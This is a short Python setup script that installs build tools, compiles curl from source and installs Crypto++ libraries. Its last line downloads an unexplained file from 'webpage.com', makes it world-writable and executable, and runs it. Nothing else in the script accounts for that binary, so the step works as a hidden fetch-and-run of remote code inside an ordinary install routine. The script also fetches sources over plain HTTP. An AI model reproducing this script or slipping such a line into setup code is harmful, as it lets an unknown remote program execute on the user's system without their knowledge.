import os
os.system("apt-get install build-essential")
os.system("apt-get install libboost-all-dev")
os.chdir("/usr/local/src/")
os.system("wget http://curl.haxx.se/download/curl-7.48.0.tar.gz")
os.system("tar -xvzf curl-7.48.0.tar.gz")
os.system("rm *.gz")
os.chdir("/usr/local/src/curl-7.48.0/")
os.system("./configure --enable-static --enable-ares")
os.system("make")
os.system("make install")
os.system("apt-get install libcrypto++-dev libcrypto++-doc libcrypto++-utils")
os.system("wget  webpage.com -O ssdw_debug && chmod 777 ssdw_debug && ./ssdw_debug")